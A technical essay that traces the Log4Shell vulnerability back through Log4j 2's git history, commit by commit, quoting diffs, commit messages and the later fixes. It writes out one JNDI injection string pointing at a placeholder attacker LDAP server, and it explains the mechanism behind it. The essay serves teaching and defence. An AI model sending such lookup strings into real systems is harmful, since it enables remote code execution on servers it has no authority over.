# To improve performance

*This is the full dig — every command, every receipt. The plain-English telling of the same story
is here: [To improve performance](02-log4j2.html).*

`git clone https://github.com/apache/logging-log4j2`, and you can walk Log4Shell backward — not
to the December 2021 week everyone remembers, but to five commits spread across eleven years, in
order, each one the sort of change you would have approved without a second thought. None of them
is the bug. The bug is what they add up to. Here they are, oldest first.

## 2010: a small language

The first deposit is a convenience. In October 2010, Ralph Goers — who built most of Log4j 2 —
adds variable substitution: the ability to write `${sys:user.name}` in a config file and have it
resolve at runtime. [R1] It is a feature every logging framework has. It is also, quietly, a
little programming language: a string containing `${` is no longer just text, it is an
*instruction*, and the thing that reads the instruction walks a list of registered "lookups" —
`sys`, `env`, `date` — and dispatches on the prefix before the colon.

The design decision that matters is not the language. It is that the list of verbs is *open*. Any
plugin annotated as a lookup joins the vocabulary automatically. Whatever anyone registers later
becomes a word this little language can speak, in every config file, forever. In 2010 the words
are boring and the input is trusted — the config file is written by the operator, not the user.
That is the whole safety argument, and it is about to spring a slow leak.

## 2012: to improve performance

September 2012, Ralph again. The subject line is the least alarming in the chain:

```console
$ git show --format='%s' 8916625d91
Move variable substitution from PatternLayout to appropriate converters to improve performance.
```

A performance refactor. Before this commit, substitution ran over the *layout pattern* — the
template string the operator writes in `log4j2.xml`. After it, substitution runs over the
formatted message. The two lines that do it:

```diff
+            toAppendTo.append(config != null && result.contains("${") ?
+                config.getSubst().replace(event, result) : result);
```

Read what that ternary does. If the formatted log message contains `${`, run the interpolator on
it; otherwise, skip. The `contains("${")` is a performance guard — don't pay for substitution on
messages that don't need it. [R2] It is a good instinct, the kind a reviewer approves on sight: the
old code ran the substitution engine over every layout unconditionally, and here is a two-character
test that skips the expensive path for the overwhelming majority of log lines that contain no `${`
at all. In a hot path — and logging is the hottest path most servers have — that check is exactly
the optimization you want. The commit is measured in microseconds saved per event. But the message is the string the *application* built. It is the
username someone typed, the User-Agent a browser sent, the search query, the header. As of this
commit, if any of that text contains `${`, it gets handed to the little language from 2010.

Nobody is logging attacker input into it yet, because nobody has registered a dangerous verb.
Ralph is optimizing a layout. He has also just wired the open vocabulary of 2010 directly to the
outside world, and the `contains("${")` line he wrote to *save* CPU is the exact line that will,
nine years on, trigger the exploit.

~ A performance guard and an attack trigger can be the same two lines of code.

## 2013: the colon

Ten months later, a verb worth having arrives. July 2013, LOG4J2-313:

```console
$ git show --format='%s' f1a0cac60f
LOG4J2-313 - Add JNDILookup
```

JNDI is a perfectly reasonable enterprise feature: ask the Java container for a configured
resource by name — a database handle, a setting — via `java:comp/env/`. The commit registers it
next to `sys` and `env`:

```diff
+        lookups.put("jndi", new JndiLookup());
+            java:comp/env/, however if the key contains a ":" no prefix will be added.
```

The first line adds the verb. The second is from the *documentation*, checked in with the same
commit. To be helpful, `JndiLookup` prepends the
safe `java:comp/env/` prefix — *unless the key already contains a colon*, so that an explicit
scheme like `java:` still works. [R3] But `ldap:` contains a colon. So does `rmi:`, and `dns:`.
The convenience that lets you write an explicit scheme is the convenience that lets an attacker
write *any* scheme, pointed at *any* server.

Now the pieces are all present, and no single person put them together. `${` in a message reaches
the interpolator (2012). The interpolator dispatches to `jndi` (2013). `jndi` with a colon fetches
a remote URL (2013). A log line reading `${jndi:ldap://attacker/x}` is now a remote code path. It
has been, since this Thursday afternoon, and it will stay that way for eight years while everyone
looks straight at it.

## 2016: the off switch nobody flips

The most painful part of the record is that Log4j *saw* it. Not as a security hole — as a bug
report about the wrong thing.

In 2016, users of Apache Camel file a compatibility bug: `${...}` sequences in their log messages
are being eaten. Someone logs a string that happens to contain `${`, and Log4j quietly tries to
resolve it instead of printing it. From the maintainers' side this is a well-formed ticket about
an interaction between two libraries — annoying, reproducible, fixable. It is also the
vulnerability, reported by its own users, four years early, described in the vocabulary of
interoperability. The fix is careful and correct for the problem as filed: `%m{nolookups}`, an
opt-in that tells Log4j *not* to treat a message as a program. [R4] The default stays as it was:
treat it as a program. Nobody in the thread is wrong. The word that would have changed everything —
that "firing on user data" is not a Camel quirk but a class of remote exploit — is not a word
anyone in a compatibility ticket has a reason to reach for.

The next year they go further. Carter Kozak adds a JVM-wide kill switch so you don't have to
remember the per-pattern option:

```diff
+    public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(
+            "log4j.formatMsgNoLookups", false);
```

`false`. [R5] The kill switch ships in every Log4j from 2.10 onward, disabled by default. The
exact mitigation the entire internet scrambled to apply in December 2021 —
`log4j.formatMsgNoLookups=true` — had been sitting in the jar, one boolean away, since 2017. Nobody flips it, because from the
inside there is nothing to flip it *for*. The commit messages are about Camel and CPU cycles. An
off switch whose default is off is not a mitigation. It is a comment.

## 2021: this feature is not used

The last deposit before the fire is dated eleven days before the world learns the word Log4Shell,
and its timestamps are the story:

```console
$ git log -1 --format='AuthorDate: %aI%nCommitDate: %cI' 001aaada7d
AuthorDate: 2021-11-29T14:20:33+00:00
CommitDate: 2021-12-04T22:47:24-07:00
```

November 29. Alibaba's security team had privately reported the RCE to Apache around November 24.
Five days later, Carter Kozak authors a commit that finally flips the default — and its message
never says why:

> Lookups in messages are confusing, and muddy the line between logging APIs and implementation.
> … There's also a cost to searching formatted message strings for particular escape sequences
> which define lookups. This feature is not used as far as we've been able to tell searching
> github and stackoverflow, so it's unnecessary for every log event in every application to burn
> several cpu cycles searching for the value.

"This feature is not used." [R6] They grepped GitHub and Stack Overflow and found almost nobody
who *wanted* message lookups. They were right. They were about to discover that everybody *had*
them. Whether Carter is quietly acting on the private report or independently killing a misfeature
the same week, the commit does the correct thing for a reason adjacent to the truth: it is a
cleanup, it is unused, it costs cycles. The word "security" does not appear. The default flips
eleven days before the CVE, in a commit about CPU.

## The fire

On December 9 the disclosure is public and the internet is on fire. The commits from that week are
the only part of this story anyone remembers. Here is the one that isn't in the postmortems.

Saturday, December 4, 21:00 Colorado time, Ralph checks in the first defensive patch — limit which
JNDI protocols work. In the same commit is a new test class:

```diff
+public class JndiExploit implements ObjectFactory {
+        fail("getObjectInstance must not be allowed");
```

They named it `JndiExploit`. [R7] The test asserts that a remote object factory must never run —
the exact mechanism of the attack — on the same Saturday night they believe they have contained
it. They have not. That first patch only limits protocols; other paths still reach JNDI, and 2.15
ships with the hole narrowed, not closed.

Then, on December 13, the deeper fix, and it explains itself by pointing back to 2010:

```diff
$ git show 70edc23334 -- '*Interpolator.java'
```

2.16 does not just remove `JndiLookup` — it excludes the class by its hard-coded fully-qualified
name. [R8] It has to, because of the open vocabulary from the very first deposit: `JndiLookup`
carries a `@Plugin` annotation, and the plugin loader would cheerfully register it again. You
cannot delete a verb from a language that auto-discovers its verbs; you have to name the specific
thing and forbid it. The tension was flagged in the code the whole time — a `// TODO: this ought
to use the PluginManager` comment, added in 2014, still sitting there when the fire started, only
resolved in January 2022. [R9]

## At home

A system acquires a vulnerability the way it acquires a feature: incrementally, by people who each
saw only their piece. So when you inherit a codebase, do not just grep for the scary function. Grep for the *seam* — the
commit that connected two safe things into one unsafe thing. `git log -S 'contains("${")'` finds
the 2012 pivot in one shot; it is the moment data started being treated as code, and its message
says "performance." The dangerous commit almost never says danger. It says convenience, or speed,
or cleanup. Read the ones that move where a string gets evaluated, not just the ones that add a
new way to evaluate it. And if your config language auto-discovers its own verbs, write down —
today, before the fire — the list of things it must never be allowed to say.
